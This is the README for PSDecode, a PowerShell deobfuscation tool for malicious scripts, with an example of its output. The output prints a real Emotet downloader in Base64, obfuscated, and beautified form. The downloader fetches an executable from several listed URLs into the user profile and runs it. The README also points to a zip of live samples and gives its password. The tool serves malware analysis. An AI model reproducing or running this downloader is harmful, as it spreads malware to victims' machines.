# PSDecode
This is a PowerShell script for deobfuscating other encoded PowerShell scripts. Often, malicious PowerShell scripts have several layers of encodings  (Replace, Base64Decode, etc...) that, once decoded, are executed via a call to Invoke-Expression (IEX, &, .), Invoke-Command, etc... This script employs a technique called method overriding that enables us to essentially intercept calls to functions that I have accounted for within this script and print out the arguments being passed to it (a.k.a what the script was trying to execute).

** Important Note #1: Only run this script within an isolated sandbox. If the encoded powershell attempts to execute a function which I have not accounted for, there is a chance it could execute**

** Important Note #2: The default execution policy for PowerShell is Restricted and if you dont use PowerShell a lot, chances are when you go to run this script, it will give you an error stating "PSDecode cannot be loaded because the execution of scripts is disabled on this system". If you receive this message, you'll need to change you execution policy to Unrestricted either temporarility or permanantly. The simplest way is to open a PowerShell command prompt as Administrator and run: set-executionpolicy unrestricted**

# To Use
1. Copy PSDecode.psm1 into $PSHome\Modules\
2. Open a new instance of PowerShell
3. Option #1 [Pass encoded PowerShell via File]:
<pre> > PSDecode .\encoded_ps.ps1</pre>
4. Option #2 [Pass encoded PowerShell via PIPE]:
<pre> > Get-Content .\encoded_ps.ps1 | PSDecode </pre>

# Example Powershell Scripts
In this repository, I've included Emotet_PowerShell_Examples.zip, which contains a few different **LIVE** emotet PowerShell scripts. You can use these to play around with PSDecode and get a better understanding of how it is supposed to function. It is important to note that **these examples are malicious** and could potentially result in an infection if handled improperly. These are provided for educational purposes only and I assume no responsibility for what you do with them. You've been warned.

The password for the archive is: **infected**

# Output Example
```PowerShell
############################## Layer 1 ##############################
JABiAFUAQQBaAF8AawA9ACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAoACIAewAxAH0AewAwAH0AIgAtAGYAIAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBjACcALAAnAEEAYwBBACcAKQAsACcAQQAnACkALAAnAE4AJwApADsAJAB1AEIAQQBBAG8AQQAgAD0AIAAnADQAMAAzACcAOwAkAGIAQQA0AEEAQQB3AHcAPQAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcAQgAnACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBaAEQAbwAnACwAJwBBAFEAJwApACkALAAnAE4AJwApADsAJABuAFUAQQB4AEQAWABHAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJAB1AEIAQQBBAG8AQQArACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcALgAnACwAJwBlAHgAZQAnACkAOwAkAGgAQQBrADEAQQBBAD0AKAAiAHsAMQB9AHsAMAB9ACIALQBmACcAQQBBACcALAAoACIAewAyAH0AewAwAH0AewAxAH0AIgAgAC0AZgAgACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBHAEEAJwAsACcAQQBjACcAKQAsACcAQQAnACwAJwBYACcAKQApADsAJABTAEEAQQBHAEQAMQBrAD0ALgAoACcAbgAnACsAJwBlAHcALQBvACcAKwAnAGIAagBlACcAKwAnAGMAdAAnACkAIABOAGAAZQBUAC4AVwBlAGIAYABDAGwAaQBlAE4AVAA7ACQAYQBVAEEAVQBVAEEAPQAoACIAewAzADkAfQB7ADEANgB9AHsAMgA0AH0AewA0ADkAfQB7ADQAfQB7ADMANQB9AHsAMwA4AH0AewAxADEAfQB7ADUAfQB7ADEAMgB9AHsAMgB9AHsAMwA0AH0AewA0ADEAfQB7ADYAfQB7ADkAfQB7ADIAMwB9AHsAMgAyAH0AewAxADkAfQB7ADQAMAB9AHsAMwB9AHsAMgA3AH0AewA0ADQAfQB7ADIAOAB9AHsAMwA2AH0AewAzADMAfQB7ADcAfQB7ADMAMAB9AHsAOAB9AHsANAA4AH0AewA0ADMAfQB7ADQANgB9AHsAMgA1AH0AewAxADQAfQB7ADAAfQB7ADIAMAB9AHsAMgAxAH0AewA0ADUAfQB7ADMAMQB9AHsAMgA2AH0AewA0ADcAfQB7ADIAOQB9AHsAMQAzAH0AewAxADcAfQB7ADEAMAB9AHsANAAyAH0AewAxAH0AewAzADcAfQB7ADMAMgB9AHsAMQA4AH0AewAxADUAfQAiACAALQBmACAAJwBuAHQAJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAnAG4AdAAnACwAJwAvAG8AJwApACwAJwBlACcAKQAsACcAaQAnACwAJwBhAF8AZgAnACwAJwBhAGcAawAnACwAJwBnACcALAAnAGkAbQAnACwAJwB0AGUAYwAnACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcALwBkACcALAAnAG8AdgAnACkALAAnAGkAJwApACwAJwBwACcALAAnAG0AJwAsACcAbAAnACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcAagBkAC8AJwAsACcAawAnACkALAAnAC4AYwAnACwAJwBjAG8AJwAsACcALwAnACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcAdAB0ACcALAAnAHAAOgAnACkALAAnAG8AJwAsACcATwAnACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAC8AdAAnACwAJwB3AGkAdAAnACkALAAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAGUAbgB0ACcALAAnAC8AJwAsACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAJwBzAF8ARwAnACwAJwBEACcAKQApACwAJwAvAEAAaAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcAYwAnACwAJwAuAGMAbwBtACcAKQAsACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcAZQAnACwAJwBjAHAAbAAnACkAKQAsACcAbABhAHQAJwAsACcALwAnACwAKAAiAHsAMgB9AHsAMAB9AHsAMQB9ACIALQBmACcALwB3ACcALAAnAHAALQAnACwAJwAuAHIAdQAnACkALAAnAHkAJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAHQAcAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBAAGgAdAAnACwAJwB4AC8AJwApACkALAAnAC8AJwAsACcAZQB0AGkAJwAsACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBpAC4AYwAnACwAJwBvAG0AJwApACwAJwBpACcAKQAsACcAZQBhAHMAJwAsACcAcQAnACwAJwByACcALAAnAF8AbwBEACcALAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAnAC8AZABvACcALAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAgACcAbwAnACwAJwBhAHIAbQBhAC4AYwAnACwAJwBtACcAKQAsACcAdgAnACkALAAnAHMAZQAnACwAJwBfACcALAAnAGkAagA3ACcALAAnAGgAJwAsACgAIgB7ADEAfQB7ADIAfQB7ADAAfQAiACAALQBmACcAaQAvACcALAAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBlAHIALQBhACcALAAnAHQAJwApACwAJwBwACcAKQAsACgAIgB7ADAAfQB7ADIAfQB7ADEAfQAiAC0AZgAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBAAGgAdAB0ACcALAAnAC8AJwApACwAJwAvAHMAJwAsACcAcAA6AC8AJwApACwAKAAiAHsAMAB9AHsAMQB9AHsAMgB9ACIALQBmACAAJwAvAHcAJwAsACcAcAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBvAG4AdAAnACwAJwAtAGMAJwApACkALAAoACIAewAyAH0AewAwAH0AewAxAH0AIgAtAGYAIAAnAF8AVQAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwAvAEAAaAB0ACcALAAnAEEAJwApACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBqAGQAJwAsACcALwBkACcAKQApACwAJwA6AC8AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcALwAvACcALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnADoAJwAsACcAdAB0AHAAJwApACkALAAoACIAewAwAH0AewAzAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAHQAcAA6ACcALAAnADgAJwAsACcAOAA4ACcALAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACcALwAvAHYAdgAnACwAJwBrACcAKQApACwAJwBuACcALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACcANwBsAGcAJwAsACcAagAnACkALAAnAC8AdAAnACkALgAiAFMAUABgAEwASQBUACIAKAAnAEAAJwApADsAJABsAG8AawBfAFUAXwA9ACgAIgB7ADIAfQB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBvACcALAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBBACcALAAnAFEAUQBBACcAKQAsACcATQBRAFgAJwApADsAZgBvAHIAZQBhAGMAaAAoACQAcQBBAF8AawBEAFUAQQAgAGkAbgAgACQAYQBVAEEAVQBVAEEAKQB7AHQAcgB5AHsAJABTAEEAQQBHAEQAMQBrAC4AIgBkAGAAbwBXAE4AbABPAGEARABGAGAAaQBMAGUAIgAoACQAcQBBAF8AawBEAFUAQQAsACAAJABuAFUAQQB4AEQAWABHACkAOwAkAFIAQQBfAEMAUQA0AFEAUQA9ACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcAQQBBACcALAAnAE8AVQAnACkALAAnAFEAQgAnACkAOwBJAGYAIAAoACgAJgAoACcARwBlAHQALQAnACsAJwBJAHQAJwArACcAZQBtACcAKQAgACQAbgBVAEEAeABEAFgARwApAC4AIgBMAGUAYABOAGAAZwBUAGgAIgAgAC0AZwBlACAAMgAxADMAOAA5ACkAIAB7ACYAKAAnAEkAbgB2AG8AJwArACcAawBlAC0ASQB0ACcAKwAnAGUAJwArACcAbQAnACkAIAAkAG4AVQBBAHgARABYAEcAOwAkAEkAQQBHAEEAVQBVAD0AKAAiAHsAMgB9AHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBaAHcAJwAsACcAVQB3ACcAKQAsACcAWgAnACwAJwBpAEQAJwApADsAYgByAGUAYQBrADsAJABqAFEARABaAFUAQgA9ACgAIgB7ADIAfQB7ADEAfQB7ADAAfQAiACAALQBmACcAQQAnACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAEQAJwAsACcAQQBBAF8AJwApACwAJwBpAEIAQQAnACkAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAFAARwBjAEEAUQBCAEMAPQAoACIAewAwAH0AewAxAH0AIgAtAGYAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBZAFUAJwAsACcAQQBVACcAKQAsACcAawAnACkALAAnAG8AJwApAA==

############################## Layer 2 ##############################
$bUAZ_k=("{1}{0}"-f("{1}{0}"-f ("{0}{1}"-f'c','AcA'),'A'),'N');$uBAAoA = '403';$bA4AAww=("{1}{0}" -f ("{0}{1}" -f'B',("{0}{1}" -f'ZDo','AQ')),'N');$nUAxDXG=$env:userprofile+'\'+$uBAAoA+("{0}{1}"-f '.','exe');$hAk1AA=("{1}{0}"-f'AA',("{2}{0}{1}" -f ("{0}{1}" -f 'GA','Ac'),'A','X'));$SAAGD1k=.('new-object') NeT.WebClieNT;$aUAUUA=("{39}{16}{24}{49}{4}{35}{38}{11}{5}{12}{2}{34}{41}{6}{9}{23}{22}{19}{40}{3}{27}{44}{28}{36}{33}{7}{30}{8}{48}{43}{46}{25}{14}{0}{20}{21}{45}{31}{26}{47}{29}{13}{17}{10}{42}{1}{37}{32}{18}{15}" -f 'nt',("{1}{0}"-f ("{0}{1}"-f'nt','/o'),'e'),'i','a_f','agk','g','im','tec',("{0}{1}"-f ("{0}{1}"-f'/d','ov'),'i'),'p','m','l',("{0}{1}"-f'jd/','k'),'.c','co','/',("{0}{1}"-f'tt','p:'),'o','O',("{0}{1}" -f '/t','wit'),("{0}{1}{2}" -f'ent','/',("{1}{0}" -f 's_G','D')),'/@h',("{1}{0}" -f("{0}{1}"-f'c','.com'),("{0}{1}" -f'e','cpl')),'lat','/',("{2}{0}{1}"-f'/w','p-','.ru'),'y',("{1}{0}"-f'tp',("{1}{0}" -f'@ht','x/')),'/','eti',("{1}{0}" -f ("{0}{1}" -f'i.c','om'),'i'),'eas','q','r','_oD',("{1}{0}{2}" -f'/do',("{1}{0}{2}" -f 'o','arma.c','m'),'v'),'se','_','ij7','h',("{1}{2}{0}" -f'i/',("{1}{0}"-f'er-a','t'),'p'),("{0}{2}{1}"-f("{1}{0}"-f'@htt','/'),'/s','p:/'),("{0}{1}{2}"-f '/w','p',("{1}{0}" -f'ont','-c')),("{2}{0}{1}"-f '_U',("{1}{0}" -f'/@ht','A'),("{0}{1}"-f 'jd','/d')),':/',("{1}{0}"-f '//',("{1}{0}" -f':','ttp')),("{0}{3}{1}{2}" -f'tp:','8','88',("{0}{1}" -f '//vv','k')),'n',("{1}{0}" -f '7lg','j'),'/t')."SPLIT"('@');$lok_U_=("{2}{0}{1}" -f 'o',("{0}{1}"-f'A','QQA'),'MQX');foreach($qA_kDUA in $aUAUUA){try{$SAAGD1k."doWNlOaDFiLe"($qA_kDUA, $nUAxDXG);$RA_CQ4QQ=("{0}{1}"-f ("{1}{0}"-f 'AA','OU'),'QB');If ((&('Get-Item') $nUAxDXG)."LeNgTh" -ge 21389) {&('Invoke-Item') $nUAxDXG;$IAGAUU=("{2}{1}{0}" -f ("{0}{1}"-f'Zw','Uw'),'Z','iD');break;$jQDZUB=("{2}{1}{0}" -f'A',("{0}{1}" -f 'D','AA_'),'iBA')}}catch{}}$PGcAQBC=("{0}{1}"-f("{0}{1}" -f ("{0}{1}"-f'YU','AU'),'k'),'o')

############################## Layer 3 ##############################
$bUAZ_k='NAcAcA';$uBAAoA = '403';$bA4AAww='NBZDoAQ';$nUAxDXG=$env:userprofile+'\'+$uBAAoA+'.exe';$hAk1AA='XGAAcAAA';$SAAGD1k=.('new-object') NeT.WebClieNT;$aUAUUA='http://tagkarma.com/dovij7lgjd/ki_oD/@http://simplatecplc.com/twitter-api/a_fx/@http://sertecii.com/dovij7lgjd/d_UA/@http://vvk888.ru/wp-content/Ds_G/@http://easyneti.com/wp-content/o_qO/'."SPLIT"('@');$lok_U_='MQXoAQQA';foreach($qA_kDUA in $aUAUUA){try{$SAAGD1k."doWNlOaDFiLe"($qA_kDUA, $nUAxDXG);$RA_CQ4QQ='OUAAQB';If ((&('Get-Item') $nUAxDXG)."LeNgTh" -ge 21389) {&('Invoke-Item') $nUAxDXG;$IAGAUU='iDZZwUw';break;$jQDZUB='iBADAA_A'}}catch{}}$PGcAQBC='YUAUko'

######################### Beautified Layer ##########################
$bUAZ_k='NAcAcA';
$uBAAoA = '403';
$bA4AAww='NBZDoAQ';
$nUAxDXG=$env:userprofile+'\'+$uBAAoA+'.exe';
$hAk1AA='XGAAcAAA';
$SAAGD1k=.('new-object') NeT.WebClieNT;
$aUAUUA='http://tagkarma.com/dovij7lgjd/ki_oD/@http://simplatecplc.com/twitter-api/a_fx/@http://sertecii.com/dovij7lgjd/d_UA/@http://vvk888.ru/wp-content/Ds_G/@http://easyneti.com/wp-content/o_qO/'."SPLIT"('@');
$lok_U_='MQXoAQQA';
foreach($qA_kDUA in $aUAUUA){
	try{
		$SAAGD1k."doWNlOaDFiLe"($qA_kDUA, $nUAxDXG);
		$RA_CQ4QQ='OUAAQB';
		If ((&('Get-Item') $nUAxDXG)."LeNgTh" -ge 21389) {
			&('Invoke-Item') $nUAxDXG;
			$IAGAUU='iDZZwUw';
			break;
			$jQDZUB='iBADAA_A'}
		}
	catch{
		}
	}
$PGcAQBC='YUAUko'


############################## Actions ##############################
    1. [System.Net.WebClient.DownloadFile] Download From: http://tagkarma.com/dovij7lgjd/ki_oD/ --> Save To: C:\Users\REM\403.exe
    2. [Get-Item.length] Retrieving length of 100000 for: C:\Users\REM\403.exe
    3. [Invoke-Item] Execute/Open: C:\Users\REM\403.exe
```
# Change Log
* 2019.05.20
  * Added Get-Item override.
  * Implemented string formatting resolver.
  * Automatic input encoding detection. -u switch is no longer required.
  * Can now handle Base64 encoded input.
  * Final layer is now Beautified.
  * DownloadFile action now only takes up a single line in the Actions output.
* 2018.06.05
  * Included -u switch that users will need to specify if the powershell script they are attempting to decode is Unicode encoded.
  * Updated script to properly handle the presence of whitespace characters wrapped in quotes.
* 2018.05.30
  * Added better handling of double quotes during script building to eliminate hard failure.
  * Implemented replace function to replace the string concatenation '+' that could be found within a malicious script with an empty string. Eliminates simple obfuscation in layer output.
* 2018.03.20 - updated script to account for changes made to newest version of Emotet's encoding scheme
